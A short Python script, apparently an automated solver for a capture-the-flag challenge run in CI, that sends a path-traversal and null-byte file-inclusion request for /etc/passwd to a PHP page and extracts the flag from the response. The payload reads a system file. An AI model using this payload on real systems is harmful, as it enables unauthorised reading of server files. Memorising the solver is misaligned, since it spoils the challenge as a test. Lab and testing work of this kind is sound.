import requests
import re
import os

host = os.environ['CI_REGISTRY_IMAGE'].replace('/','-')
r = requests.get(f"http://{host}/index.php?page=../../../etc/passwd%00")
print ("flag{", re.findall("flag\{(.*?)\}", r.text)[0], "}", sep="")

